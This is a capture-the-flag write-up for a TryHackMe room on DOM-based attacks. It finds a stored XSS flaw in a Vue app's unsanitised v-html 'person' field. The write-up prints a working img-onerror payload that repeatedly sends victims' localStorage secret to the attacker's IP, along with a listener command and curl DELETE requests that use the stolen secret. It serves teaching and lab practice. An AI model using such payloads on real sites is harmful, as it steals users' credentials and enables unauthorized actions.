# DOM-Based Attacks
**Description:** Learn about DOM-based vulnerabilities that can be leveraged to stage client-side attacks!  
**Difficulty:** Easy  
**Link:** https://tryhackme.com/r/room/dombasedattacks

## Task 7: DOM-Based Attack Challenge

Before starting our investigation we add the target machine's IP address to /etc/hosts. This file maps hostnames to IP addresses, allowing for local and static DNS resolution that overrides any cache or outside resolver. The entry we're adding

```
sudo echo 10.10.144.235 lists.tryhackme.loc >> /etc/hosts
```

![screenshot1](/DOM-Based_Attacks/assets/screenshot1.png)

means whenever an application like a web browser resolves `lists.tryhackme.loc` it gets `10.10.144.235` back.

Now we can open Firefox and look at `http://lists.tryhackme.loc:5173/`

![screenshot2](/DOM-Based_Attacks/assets/screenshot2.png)

Our task is to delete all birthdays, but if we click on the delete button, we receive an error message `Oops, incorrect secret to perform this action!`. Let's try to answer the first two questions:

>What is the source field name that makes the application vulnerable to XSS?
>
>What is the sink Vue directive that makes the application vulnerable to XSS?

Inspecting the source code (`Right click => View Page Source` or `Ctrl+U`) reveals very little. The reason is that we're dealing with a so-called single-page application (SPA). Unlike traditional websites, the initial document contains only a bare-bones HTML structure. The actual content is dynamically loaded from the server and added to the [DOM](https://en.wikipedia.org/wiki/Document_Object_Model) using JavaScript.

![screenshot3](/DOM-Based_Attacks/assets/screenshot3.png)

We can make use of the Developer Tools feature in Firefox (`Right click => Inspect or F12`) to get around this limitation. In the `Debugger` tab we open `Main Thread => lists.tryhackme.loc:5173 => src => Bdays.vue(mapped)` for a combined view of HTML markup and JavaScript code:

![screenshot4](/DOM-Based_Attacks/assets/screenshot4.png)

Line 26 immediately catches my attention. Highlighted in green we see the `person` property of the `bday` object, placed in a cell (`<td>`) inside a row (`<tr`) of the body (`<tbody>`) of an HTML table (`<table>`). What's remarkable here is that the developers chose a different method of including dynamic content in the HTML markup for the `bdate` property in the following line:

```HTML
<td><p v-html=bday.person></p></td>
<td>{{ bday.bdate }}</td>
```

Searching the web for `vue v-html` we find on the [fantastic W3Schools website](https://www.w3schools.com/vue/ref_v-html.php):

![screenshot5](/DOM-Based_Attacks/assets/screenshot5.png)

Both `v-html` and double curly braces can be used to insert data into a Vue template. Double curly braces sanitize the output by replacing certain characters with [HTML character entities](https://www.w3schools.com/html/html_entities.asp), `v-html` does not. The [example](https://www.w3schools.com/vue/tryit.php?filename=tryvue_ref_v-html) further demonstrates this behavior:

![screenshot6](/DOM-Based_Attacks/assets/screenshot6.png)

For more explanations on this topic see the [Vue.js documentation page](https://vuejs.org/guide/best-practices/security) from hint 2. And with that we have answered the first two questions. The source field making the application vulnerable to XSS is `person`, because its value is injected into HTML using the Vue `v-html` directive, which does not sanitize potentially malicious user input. Now it's time to exploit that to answer the last question:

>What is the value of the flag that you receive once you deleted all the birthdays?

We know where to insert code into the application, but we haven't got a payload and a way to execute it yet. The naive approach

```HTML
<script>console.log('xss')</script>
```

does nothing, because script tags dynamically added to the DOM after the initial page load are not executed by the browser (there is some nuance to this statement, but I must refer to Google for the finer details). We can instead try the workaround described in the article [linked in task 6](https://labs.withsecure.com/publications/getting-real-with-xss):

```HTML
<img src="x" onerror="console.log('xss')">
```

We act as if we were adding an image, but since the location we provide as `src` does not exist, the code in the `onerror` attribute is executed. Submitting a new birthday with that line as `Person` and a random value for `Date` we observe `xss` being output in the `Console` tab of the Firefox Developer Tools. Bazinga!

We are now able to have arbitrary code execute in the browser of anyone who visits the birthday application. Going through the code again we find the JavaScript function responsible for deleting birthday entries:

```JavaScript
removeBday(bdayID) {
    var secret = localStorage.getItem('secret');
    const path = `http://lists.tryhackme.loc:5001/bdays/${bdayID}?secret=`;
    axios.delete(path + secret)
    .then((res) => {
        this.getBdays();
        this.message = res.data.message;
        this.showMessage = true;
    })
    .catch((error) => {
        console.error(error);
        this.getBdays();
    });
},
```

We learn two things:

* API requests must be sent to port 5001, whereas the web page is served on port 5173
* we need some sort of secret to authenticate to the server

Going back to the task description:

>You need to trick another application user into giving you sensitive information.

A search for `secret` in `Bday.vue(mapped)` shows how the secret is stored in the browser and retrieved again:

```JavaScript
var secret = localStorage.getItem('secret');
```

MDN provides [background](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage):

![screenshot7](/DOM-Based_Attacks/assets/screenshot7.png)

Assuming other visitors of the web application are in possesion of the secret, all we need to do is read it from their browser and send it to ourselves. In pseudocode:

```JavaScript
sendToOurselves(localStorage.getItem('secret'))
```

For the "send to ourselves" part you either know JavaScript well enough (I don't), Google it, or use OpenAI's brand new [GPT-4o model](https://openai.com/index/hello-gpt-4o/) to write the code for you:

![screenshot8](/DOM-Based_Attacks/assets/screenshot8.png)

We get rid of the error handling part, add the IP address of the attacker machine (`ifconfig`) and the secret retrieval:

```JavaScript
fetch('http://10.10.158.224:4242?secret=' + encodeURIComponent(localStorage.getItem('secret'))).then(response => {});
```

Taking the room text into consideration

>Furthermore, if you are able to get an interaction from the user but it isn't exactly what you were hoping for, perhaps the answer is to monitor the user closer and for longer!

we add an interval that executes the code every two seconds

```JavaScript
setInterval(function() {fetch('http://10.10.158.224:4242?secret=' + encodeURIComponent(localStorage.getItem('secret'))).then(response => {})},2000);
```

and finally wrap all that in our `<img>` trick for the final payload:

```JavaScript
<img src="x" onerror="setInterval(function() {fetch('http://10.10.158.224:4242?secret=' + encodeURIComponent(localStorage.getItem('secret'))).then(response => {})},2000);">
```

Now all we have to do is start a local http server listening on the port specified in our payload,

```
python3 -m http.server 4242
```

add a birthday in the web app with our payload as `Person` and an arbitrary `Date`,

![screenshot9](/DOM-Based_Attacks/assets/screenshot9.png)

and wait for the right person to visit the website and send us the coveted secret:

![screenshot10](/DOM-Based_Attacks/assets/screenshot10.png)

```
thisisthesupersecretvalue
```

Very creative. We're almost there. Let's look at the code to remove a birthday again:

```JavaScript
removeBday(bdayID) {
    var secret = localStorage.getItem('secret');
    const path = `http://lists.tryhackme.loc:5001/bdays/${bdayID}?secret=`;
    axios.delete(path + secret)
    .then((res) => {
        this.getBdays();
        this.message = res.data.message;
        this.showMessage = true;
    })
    .catch((error) => {
        console.error(error);
        this.getBdays();
    });
},
```

We have the secret, but we also need IDs of the individual birthday entries. I'll spare you my attempt to brute-force them (`0,1,2,00,01,02,...`). The solution is much more straightforward. We fire up `Burp Suite` and enable `FoxyProxy` to route all web requests to the proxy:

![screenshot11](/DOM-Based_Attacks/assets/screenshot11.png)

Now reload `http://lists.tryhackme.loc:5173/` in the browser. Clicking through the HTTP requests in Burp Suite we eventually come across one that requests `/bdays` on the API port `5001`:

![screenshot12](/DOM-Based_Attacks/assets/screenshot12.png)

We forward the request to the `Repeater` module (`Right click => Send to Repeater`), switch to the `Repeater` tab and click on `Send`. The response appears in the text box on the right and includes the IDs we were looking for.

![screenshot13](/DOM-Based_Attacks/assets/screenshot13.png)

What's left is using the secret and the IDs to delete all entries. Consulting the code of the `removeBday` function one last time, this is the structure of the API requests:

```JavaScript
const path = `http://lists.tryhackme.loc:5001/bdays/${bdayID}?secret=`;
```

You could do this in Burp Suite as well, even automate the requests with a list of all four IDs, but I prefer `cURL`:

```Shell
curl -X DELETE -H "Host: lists.tryhackme.loc:5001" http://lists.tryhackme.loc:5001/bdays/dbdefbf781aa4cdca3139e081000160b?secret=thisisthesupersecretvalue
```

The server lets us known

```JSON
{"message":"Bday removed!","status":"success"}
```

and we repeat the process three more times, each time copying a birthday ID from Burp Suite Repeater:

![screenshot14](/DOM-Based_Attacks/assets/screenshot14.png)

Reloading the web application in the browser (after turning off FoxyProxy) we find a page devoid of any birthdays. Success! Someone left a message for us in the Developer Tools Console:

```
Well done! Make a request to http://lists.tryhackme.loc:5001/ping to receive your flag!
```

A final click on the link and we're done with this fun and instructive, but probably more "Medium" than "Easy" room that might as well have been categorized as a challenge:

![screenshot15](/DOM-Based_Attacks/assets/screenshot15.png)

This concludes my second write-up. I hope everything was clear and as always appreciate feedback.
